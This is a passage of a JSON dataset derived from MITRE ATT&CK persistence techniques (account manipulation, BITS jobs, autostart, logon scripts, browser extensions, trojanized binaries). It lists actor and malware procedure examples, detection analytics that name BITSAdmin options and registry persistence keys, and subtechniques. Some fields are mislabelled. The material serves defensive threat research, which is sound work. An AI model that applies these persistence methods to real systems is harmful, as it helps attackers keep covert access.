      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Pod Modification",
        "detects": "Monitor for changes made to pods for unexpected modifications to settings and/or control data that may deploy a container into an environment to facilitate execution or evade defenses."
      }
    ],
    "Subtechniques": "DefenseEvasion, Execution"
  },
  {
    "Title": "Account Manipulation",
    "Code": "T1098",
    "Description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.",
    "Mitigation": [
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network.[1]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has been known to add created accounts to local admin groups to maintain elevated access.[2]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 has added user accounts to the User and Admin groups.[3]"
      },
      {
        "id": "S0274",
        "name": "Calisto",
        "description": "Calisto adds permissions and remote logins to all users.[4]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has added newly created accounts to the administrators group to maintain elevated access.[5]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has assigned newly created accounts the sysadmin role to maintain persistence.[6]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has granted privileges to domain accounts.[7]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has added accounts to specific groups with net localgroup.[8]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.[9][10]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.[11]"
      },
      {
        "id": "S0002",
        "name": "Mimikatz",
        "description": "The Mimikatz credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value.[12][13]"
      },
      {
        "id": "S0382",
        "name": "ServHelper",
        "description": "ServHelper has added a user named \"supportaccount\" to the Remote Desktop Users and Administrators groups.[14]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM has added user accounts to local Admin groups.[15]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for the registration or joining of new device objects in Active Directory. Raise alerts when new devices are registered or joined without using MFA.[16]"
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for suspicious commands to modify accounts or account settings (including files such as the authorized_keys or /etc/ssh/sshd_config).Monitor executed commands and arguments of suspicious commands (such as Add-MailboxPermission) that may be indicative of modifying the permissions of Exchange and other related service settings."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files related to account settings, such as /etc/ssh/sshd_config and the authorized_keys file for each user on a system."
      },
      {
        "id": "DS0036",
        "dsource": "Group",
        "dcomp": "Group Modification",
        "detects": "Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed processes indicative of modifying account settings, such as those that modify authorized_keys or /etc/ssh/sshd_config files."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Modification",
        "detects": "Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670. Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ or that include additional flags such as changing a password without knowledge of the old password.Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1098.001",
        "name": "Additional Cloud Credentials"
      },
      {
        "id": "T1098.002",
        "name": "Additional Email Delegate Permissions"
      },
      {
        "id": "T1098.003",
        "name": "Additional Cloud Roles"
      },
      {
        "id": "T1098.004",
        "name": "SSH Authorized Keys"
      },
      {
        "id": "T1098.005",
        "name": "Device Registration"
      },
      {
        "id": "T1098.006",
        "name": "Additional Container Cluster Roles"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation"
  },
  {
    "Title": "BITS Jobs",
    "Code": "T1197",
    "Description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM).[1][2] BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.[2][3]Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.[4][5][6] BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).[7][4]BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.[4]",
    "Mitigation": [
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.[8]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used BITSAdmin to download and install payloads.[9][10]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar has been downloaded via Windows BITS functionality.[11]"
      },
      {
        "id": "S0190",
        "name": "BITSAdmin",
        "description": "BITSAdmin can be used to create BITS Jobs to launch a malicious process.[12]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin.[13][14][15]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has used BITSadmin to download and execute malicious DLLs.[16]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "A JPIN variant downloads the backdoor payload via the BITS service.[17]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has used BITSAdmin to download additional tools.[18]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can use BITS Utility to connect with the C2 server.[19]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork has used BITS jobs to download malicious payloads.[20]"
      },
      {
        "id": "S0654",
        "name": "ProLock",
        "description": "ProLock can use BITS jobs to download its malicious payload.[21]"
      },
      {
        "id": "S0333",
        "name": "UBoatRAT",
        "description": "UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.[7]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine.[22]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments from the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)[2] Admin logs, PowerShell logs, and the Windows Event log for BITS activity.[23] Also consider investigating more detailed information about jobs by parsing the BITS job database.[4]"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account)."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed BITS tasks to enumerate using the BITSAdmin tool (bitsadmin /list /allusers /verbose). Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). Analytic 1 is oriented around looking for the creation of Microsoft Background Intelligent Transfer Service utility (bitsadmin.exe) processes that schedule a BITS job to persist on an endpoint. The analytic identifies the command-line parameters used to create, resume or add a file to a BITS job; these are typically seen combined in a single command-line or executed in sequence.Analytic 2 identifies Microsoft Background Intelligent Transfer Service utility  bitsadmin.exe  using the  transfer parameter to download a remote object. In addition, look for  download  or  upload  on the command-line, the switches are not required to perform a transfer. Capture any files downloaded. Review the reputation of the IP or domain used. Typically once executed, a follow on command will be used to execute the dropped file. Network connection or file modification events related will not spawn or create from  bitsadmin.exe , but the artifacts will appear in a parallel process of  svchost.exe  with a command-line similar to  svchost.exe -k netsvcs -s BITS . It’s important to review all parallel and child processes to capture any behaviors and artifacts. In some suspicious and malicious instances, BITS jobs will be created. You can use  bitsadmin /list /verbose  to list out the jobs during investigation. Analytic 1 - BITS Job Persistence  processes = filter processes where (  (event_id == \"1\" OR event_id == \"4688\") AND  exe =\"C:\\Windows\\System32\\bitsadmin.exe\" AND   (command_line == \"create\" OR   command_line == \"addfile\" OR    command_line == \"setnotifyflags\" OR   command_line == \"setnotifycmdline\" OR   command_line == \"setminretrydelay\" OR    command_line == \"setcustomheaders\" OR   command_line == \"resume\")) Analytic 2 : BITSAdmin Download File  bitsadmin_commands = filter processes where (  exe =\"C:\\Windows\\System32\\bitsadmin.exe\" AND command_line = transfer)output bitsadmin_commands"
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Metadata",
        "detects": "BITS runs as a service and its status can be checked with the Sc query utility (sc query bits).[24]"
      }
    ],
    "Subtechniques": "DefenseEvasion, Persistence"
  },
  {
    "Title": "Boot or Logon Autostart Execution",
    "Code": "T1547",
    "Description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.[1][2][3][4][5] These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
    "Mitigation": [
      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon established persistence by setting the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load registry key to point to its executable.[6]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack’s RAT makes a persistent target file with auto execution on the host start.[7]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type has created registry keys for persistence, including HKCU\\Software\\bkfouerioyou, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}.[8]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "Misdat has created registry keys for persistence, including HKCU\\Software\\dnimtsoleht\\StubPath, HKCU\\Software\\snimtsOleht\\StubPath, HKCU\\Software\\Backtsaleht\\StubPath, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}.[8]"
      },
      {
        "id": "S0653",
        "name": "xCaon",
        "description": "xCaon has added persistence via the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load which causes the malware to run each time any user logs in.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for unusual kernel driver installation activity that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "DS0008",
        "dsource": "Kernel",
        "dcomp": "Kernel Module Load",
        "detects": "Monitor for unusual kernel driver installation activity that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Suspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data to increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for additions of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1547.001",
        "name": "Registry Run Keys / Startup Folder"
      },
      {
        "id": "T1547.002",
        "name": "Authentication Package"
      },
      {
        "id": "T1547.003",
        "name": "Time Providers"
      },
      {
        "id": "T1547.004",
        "name": "Winlogon Helper DLL"
      },
      {
        "id": "T1547.005",
        "name": "Security Support Provider"
      },
      {
        "id": "T1547.006",
        "name": "Kernel Modules and Extensions"
      },
      {
        "id": "T1547.007",
        "name": "Re-opened Applications"
      },
      {
        "id": "T1547.008",
        "name": "LSASS Driver"
      },
      {
        "id": "T1547.009",
        "name": "Shortcut Modification"
      },
      {
        "id": "T1547.010",
        "name": "Port Monitors"
      },
      {
        "id": "T1547.012",
        "name": "Print Processors"
      },
      {
        "id": "T1547.013",
        "name": "XDG Autostart Entries"
      },
      {
        "id": "T1547.014",
        "name": "Active Setup"
      },
      {
        "id": "T1547.015",
        "name": "Login Items"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Boot or Logon Initialization Scripts",
    "Code": "T1037",
    "Description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
    "Mitigation": [
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup.[1]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has installed an \"init.d\" startup script to maintain persistence.[2]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "Depending on the Linux distribution and when executing with root permissions, RotaJakiro may install persistence using a .conf file in the /etc/init/ folder.[3]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made in the Active Directory that may use scripts automatically executed at boot or logon initialization to establish persistence."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may consist of logon scripts for unusual access by abnormal users or at abnormal times."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may use scripts automatically executed at boot or logon initialization to establish persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that are modified by unusual accounts outside of normal administration duties."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may use scripts automatically executed at boot or logon initialization to establish persistence. Adversaries may schedule software to run whenever a user logs into the system; this is done to establish persistence and sometimes for lateral movement. This trigger is established through the registry key HKEY_CURRENT_USER\\EnvironmentUserInitMprLogonScript. This signature looks edits to existing keys or creation of new keys in that path. Users purposefully adding benign scripts to this path will result in false positives; that case is rare, however. There are other ways of running a script at startup or login that are not covered in this signature. Note that this signature overlaps with the Windows Sysinternals Autoruns tool, which would also show changes to this registry path.Analytic 1 - Boot or Logon Initialization Scripts logon_script_key_processes = filter processes where (  command_line = \"regadd\\EnvironmentUserInitMprLogonScript\")registry = search (Registry:Add OR Registry:Edit)registry_logon_key_events = filter registry where (  key = \"\\EnvironmentUserInitMprLogonScript\")"
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for newly constructed windows registry keys that may use scripts automatically executed at boot or logon initialization to establish persistence."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1037.001",
        "name": "Logon Script (Windows)"
      },
      {
        "id": "T1037.002",
        "name": "Login Hook"
      },
      {
        "id": "T1037.003",
        "name": "Network Logon Script"
      },
      {
        "id": "T1037.004",
        "name": "RC Scripts"
      },
      {
        "id": "T1037.005",
        "name": "Startup Items"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Browser Extensions",
    "Code": "T1176",
    "Description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.[1][2]Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.[3] Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.Previous to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files. In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction.[4]Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.[5][6][7][8]There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.[9] There have also been similar examples of extensions being used for command & control.[10]",
    "Mitigation": [
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore can install malicious browser extensions that are used to hijack user searches.[11]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can use malicious browser extensions to steal cookies and other user information.[12]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.[13][14]"
      },
      {
        "id": "S0402",
        "name": "OSX/Shlayer",
        "description": "OSX/Shlayer can install malicious Safari browser extensions to serve ads.[15][16]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for usage of the profiles tool, such as profiles install -type=configuration."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files and/or all installed extensions maintain a plist file in the /Library/Managed Preferences/username/ directory. Ensure all listed files are in alignment with approved extensions"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that could be used to abuse internet browser extensions to establish persistence."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation."
      }
    ],
    "Subtechniques": "\nPersistence"
  },
  {
    "Title": "Compromise Client Software Binary",
    "Code": "T1554",
    "Description": "Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)[1] prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.[2]Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.",
    "Mitigation": [
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer.[3]"
      },
      {
        "id": "S0486",
        "name": "Bonadan",
        "description": "Bonadan has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.[4]"
      },
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.[5]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer has used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism.[3]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.[4]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos replaced the SSH client with a trojanized SSH client to steal credentials on compromised systems.[6]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest searches through the /Users/ folder looking for executable files. For each executable, ThiefQuest prepends a copy of itself to the beginning of the file. When the file is executed, the ThiefQuest code is executed first. ThiefQuest creates a hidden file, copies the original target executable to the file, then executes the new hidden file to maintain the appearance of normal behavior. [7][8]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules.[9]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may modify client software binaries to establish persistent access to systems."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Deletion",
        "detects": "Monitor for unexpected deletion of  client software binaries to establish persistent access to systems."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Metadata",
        "detects": "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor changes to client software that do not correlate with known software or patch cycles."
      }
    ],
    "Subtechniques": "\nPersistence"
  },
  {
    "Title": "Create Account",
    "Code": "T1136",
    "Description": "Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",
    "Mitigation": [
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team added a login to a SQL Server with sp_addlinkedsrvlogin.[1]"
      },
      {
        "id": "G0119",
        "name": "Indrik Spider",
        "description": "Indrik Spider used wmic.exe to add a new user to the system.[2]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that are associated with account creation, such as net user or useradd"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes associated with account creation, such as net.exe"
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Creation",
        "detects": "Monitor for newly constructed user accounts through account audits to detect suspicious accounts that may have been created by an adversary. Collect data on account creation within a network or Windows Event ID 4720 (for when a user account is created on a Windows system and domain controller)."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1136.001",
        "name": "Local Account"
      },
      {
        "id": "T1136.002",
        "name": "Domain Account"
      },
      {
        "id": "T1136.003",
        "name": "Cloud Account"
      }
    ],
    "Tactic": "\nPersistence"
  },
  {
    "Title": "Create or Modify System Process",
    "Code": "T1543",
    "Description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.[1] On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.[2] Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.[3]",
    "Mitigation": [
      {
        "id": "S0401",
        "name": "Exaramel for Linux",
        "description": "Exaramel for Linux has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques."
      },
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for new service driver installations and loads (ex: Sysmon Event ID 6) that are not part of known software update/patch cycles."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes to files associated with system-level processes."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "New, benign system processes may be created during installation of new software."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Creation",
        "detects": "Monitor for newly constructed services/daemons that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Service Modification",
        "detects": "Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for newly constructed windows registry keys that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes to windows registry keys and/or values that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1543.001",
        "name": "Launch Agent"
      },
      {
        "id": "T1543.002",
        "name": "Systemd Service"
      },
      {
        "id": "T1543.003",
        "name": "Windows Service"
      },
      {
        "id": "T1543.004",
        "name": "Launch Daemon"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Event Triggered Execution",
    "Code": "T1546",
    "Description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.[1][2][3]Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.[4][5][6]Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
    "Mitigation": [
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0025",
        "dsource": "Cloud Service",
        "dcomp": "Cloud Service Modification",
        "detects": "Monitor the creation and modification of cloud resources that may be abused for persistence, such as functions and workflows monitoring cloud events."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
